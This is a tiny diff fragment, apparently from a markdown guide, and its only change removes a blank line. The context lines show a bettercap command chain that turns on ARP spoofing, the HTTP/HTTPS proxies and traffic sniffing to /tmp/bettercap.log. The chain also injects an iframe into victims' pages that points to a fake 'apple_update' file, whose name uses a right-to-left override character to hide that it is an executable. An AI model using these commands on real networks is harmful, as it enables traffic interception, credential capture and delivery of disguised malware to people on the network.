@@ -132,7 +132,6 @@ set http.proxy.injecthtml '<iframe src=\"http://$LAN/apple_update-%E2%80%AEexe.j
 set net.sniff.verbose true; \
 set net.sniff.output /tmp/bettercap.log; \
 net.sniff on; http.proxy on; https.proxy on; arp.spoof on"
-
 ```
 
 _Run & Execute_
